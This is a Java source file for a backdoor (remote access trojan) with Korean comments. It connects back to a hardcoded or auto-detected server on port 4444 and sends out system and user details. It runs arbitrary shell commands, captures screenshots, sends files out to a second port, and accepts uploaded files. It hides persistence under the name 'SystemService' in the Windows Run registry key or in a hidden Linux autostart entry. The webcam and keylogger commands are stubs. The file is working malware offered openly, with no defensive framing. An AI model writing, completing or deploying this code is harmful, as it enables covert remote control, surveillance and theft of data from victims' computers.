import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.util.Enumeration;
import javax.imageio.ImageIO;

public class BackDoor {
    private static String getLocalIP() {
        try {
            // 네트워크 인터페이스 목록 가져오기
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();

            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();

                // 비활성화된 인터페이스나 루프백은 건너뛰기
                if (iface.isLoopback() || !iface.isUp())
                    continue;

                // 각 인터페이스의 IP 주소 확인
                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();

                    // IPv4 주소만 고려하고, 로컬 주소는 제외
                    if (addr instanceof Inet4Address && !addr.isLoopbackAddress()) {
                        String ip = addr.getHostAddress();
                        // 실제 외부 연결 가능한 IP 찾기 (사설 IP 대역 확인)
                        if (ip.startsWith("192.168.") || ip.startsWith("10.") ||
                                ip.startsWith("172.16.") || ip.startsWith("172.31.")) {
                            return ip;
                        }
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("IP 주소 가져오기 실패: " + e.getMessage());
        }

        // 기본값으로 서버 IP 반환 (자동 감지 실패 시)
        return "10.96.120.75"; // 언냐의 기본 서버 IP
    }

    // 기존의 SERVER_IP 상수 대신 이렇게 변경
    private static final String SERVER_IP = getLocalIP();
    private static final int PORT = 4444;
    private static final long RECONNECT_DELAY = 10000; // 10초마다 재연결 시도
    private static final String PERSISTENCE_NAME = "SystemService"; // 시작 프로그램 등록 이름

    public static void main(String[] args) {
        // 프로그램 시작 시 자동으로 시작 프로그램에 등록
        setupPersistence();
        
        // 백도어 메인 루프 - 연결 끊겨도 계속 재시도
        while (true) {
            try {
                // 서버에 연결
                Socket socket = new Socket(SERVER_IP, PORT);
                System.out.println("[+] 서버에 연결됨: " + SERVER_IP + ":" + PORT);
                
                // 명령 처리 스레드 시작
                processCommands(socket);
                
            } catch (Exception e) {
                // 연결 실패 시 조용히 대기 후 재시도
                try {
                    Thread.sleep(RECONNECT_DELAY);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                }
            }
        }
    }
    
    // 명령 처리 메서드
    private static void processCommands(Socket socket) throws Exception {
        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        
        // 클라이언트 시스템 정보 전송
        out.println("[시스템 정보]");
        out.println("OS: " + System.getProperty("os.name"));
        out.println("사용자: " + System.getProperty("user.name"));
        out.println("작업 디렉토리: " + System.getProperty("user.dir"));
        out.println("명령어 도움말: help");
        
        String command;
        while ((command = in.readLine()) != null) {
            // 명령어 처리
            if (command.equals("help")) {
                showHelp(out);
            } else if (command.equals("exit")) {
                break;
            } else if (command.startsWith("shell ")) {
                executeShell(command.substring(6), out);
            } else if (command.equals("screenshot")) {
                takeScreenshot(out);
            } else if (command.startsWith("download ")) {
                downloadFile(command.substring(9), socket, out);
            } else if (command.startsWith("upload ")) {
                uploadFile(command.substring(7), socket, out);
            } else if (command.equals("webcam")) {
                captureWebcam(out);
            } else if (command.equals("keylogger_start")) {
                startKeylogger(out);
            } else if (command.equals("keylogger_dump")) {
                dumpKeylogger(out);
            } else {
                out.println("알 수 없는 명령어. 'help'를 입력하세요.");
            }
        }
        
        socket.close();
    }
    
    // 도움말 표시
    private static void showHelp(PrintWriter out) {
        out.println("\n===== 백도어 명령어 목록 =====");
        out.println("help - 이 도움말 표시");
        out.println("shell [명령어] - 시스템 명령어 실행");
        out.println("screenshot - 화면 캡처 후 서버로 전송");
        out.println("webcam - 웹캠 캡처 후 서버로 전송");
        out.println("download [파일경로] - 대상 컴퓨터의 파일을 서버로 다운로드");
        out.println("upload [파일명] - 서버에서 대상 컴퓨터로 파일 업로드");
        out.println("keylogger_start - 키로거 시작");
        out.println("keylogger_dump - 키로거 기록 확인");
        out.println("exit - 백도어 세션 종료");
        out.println("===========================\n");
    }
    
    // 시스템 명령어 실행
    private static void executeShell(String cmd, PrintWriter out) {
        try {
            Process process;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                process = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
            } else {
                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
            }
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            
            while ((line = errorReader.readLine()) != null) {
                out.println("ERROR: " + line);
            }
        } catch (IOException e) {
            out.println("명령어 실행 중 오류: " + e.getMessage());
        }
    }
    
    // 화면 캡처
    private static void takeScreenshot(PrintWriter out) {
        try {
            // 화면 캡처
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage capture = new Robot().createScreenCapture(screenRect);
            
            // 임시 파일로 저장
            File temp = File.createTempFile("screenshot_", ".png");
            ImageIO.write(capture, "png", temp);
            
            out.println("스크린샷 캡처 완료: " + temp.getAbsolutePath());
            
            // 서버로 파일 전송
            downloadFile(temp.getAbsolutePath(), out);
            
            // 임시 파일 삭제
            temp.delete();
        } catch (Exception e) {
            out.println("스크린샷 캡처 오류: " + e.getMessage());
        }
    }
    
    // 파일 다운로드 (클라이언트 -> 서버)
    private static void downloadFile(String filePath, Socket socket, PrintWriter out) {
        try {
            downloadFile(filePath, out);
        } catch (Exception e) {
            out.println("파일 다운로드 오류: " + e.getMessage());
        }
    }
    
    // 파일 다운로드 구현 (클라이언트 -> 서버)
    private static void downloadFile(String filePath, PrintWriter out) throws Exception {
        File file = new File(filePath);
        if (!file.exists() || !file.isFile()) {
            out.println("파일을 찾을 수 없음: " + filePath);
            return;
        }
        
        // 파일 전송 준비
        out.println("FILE_TRANSFER_START");
        out.println(file.getName());
        out.println(file.length());
        
        // 여기 부분 수정!
        Socket dataSocket = new Socket(SERVER_IP, PORT + 1);
        try (FileInputStream fis = new FileInputStream(file);
             OutputStream os = dataSocket.getOutputStream()) {
            
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
                os.flush();
            }
        }
        dataSocket.close();
    
        out.println("FILE_TRANSFER_COMPLETE");
    }
    
    // 파일 업로드 (서버 -> 클라이언트)
    private static void uploadFile(String fileName, Socket socket, PrintWriter out) {
        try {
            out.println("파일 업로드 준비 완료. 전송을 시작하세요...");
            
            // 서버로부터 파일 정보 수신
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String fileSize = in.readLine();
            long size = Long.parseLong(fileSize);
            
            // 파일 저장
            File outputFile = new File(fileName);
            try (FileOutputStream fos = new FileOutputStream(outputFile);
                 BufferedInputStream bis = new BufferedInputStream(socket.getInputStream())) {
                
                byte[] buffer = new byte[8192];
                int bytesRead;
                long totalRead = 0;
                
                while (totalRead < size && (bytesRead = bis.read(buffer, 0, (int) Math.min(buffer.length, size - totalRead))) != -1) {
                    fos.write(buffer, 0, bytesRead);
                    totalRead += bytesRead;
                }
            }
            
            out.println("파일 업로드 완료: " + outputFile.getAbsolutePath());
        } catch (Exception e) {
            out.println("파일 업로드 오류: " + e.getMessage());
        }
    }
    
    // 웹캠 캡처
    private static void captureWebcam(PrintWriter out) {
        try {
            out.println("이 기능은 외부 라이브러리가 필요합니다. webcam-capture 라이브러리를 사용하세요.");
            // 실제 구현은 webcam-capture 같은 외부 라이브러리 필요
        } catch (Exception e) {
            out.println("웹캠 캡처 오류: " + e.getMessage());
        }
    }
    
    // 키로거 시작
    private static void startKeylogger(PrintWriter out) {
        try {
            out.println("이 기능은 JNativeHook 같은 외부 라이브러리가 필요합니다.");
            // 실제 구현은 JNativeHook 같은 외부 라이브러리 필요
        } catch (Exception e) {
            out.println("키로거 시작 오류: " + e.getMessage());
        }
    }
    
    // 키로거 기록 확인
    private static void dumpKeylogger(PrintWriter out) {
        try {
            out.println("키로거가 활성화되지 않았거나 기록이 없습니다.");
        } catch (Exception e) {
            out.println("키로거 기록 확인 오류: " + e.getMessage());
        }
    }
    
    // 시작 프로그램 등록 (자동 실행 설정)
    private static void setupPersistence() {
        try {
            String jarPath = new File(BackDoor.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath();
            
            // Windows 시스템인 경우 레지스트리에 등록
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                // 레지스트리 키 생성
                String command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " 
                               + PERSISTENCE_NAME + " /t REG_SZ /d \"" + jarPath + "\" /f";
                
                Runtime.getRuntime().exec(command);
                System.out.println("Windows 시작 프로그램에 등록 완료");
            } 
            // Linux/macOS 시스템인 경우 시작 스크립트 생성
            else {
                String homeDir = System.getProperty("user.home");
                File startupScript = new File(homeDir + "/.config/autostart/backdoor.desktop");
                
                if (!startupScript.getParentFile().exists()) {
                    startupScript.getParentFile().mkdirs();
                }
                
                try (PrintWriter writer = new PrintWriter(startupScript)) {
                    writer.println("[Desktop Entry]");
                    writer.println("Type=Application");
                    writer.println("Name=" + PERSISTENCE_NAME);
                    writer.println("Exec=java -jar " + jarPath);
                    writer.println("Terminal=false");
                    writer.println("NoDisplay=true");
                    writer.println("X-GNOME-Autostart-enabled=true");
                }
                
                // 실행 권한 설정
                startupScript.setExecutable(true);
                System.out.println("Linux/macOS 시작 프로그램에 등록 완료");
            }
        } catch (Exception e) {
             System.err.println("시작 프로그램 등록 오류: " + e.getMessage());
        }
    }
}
                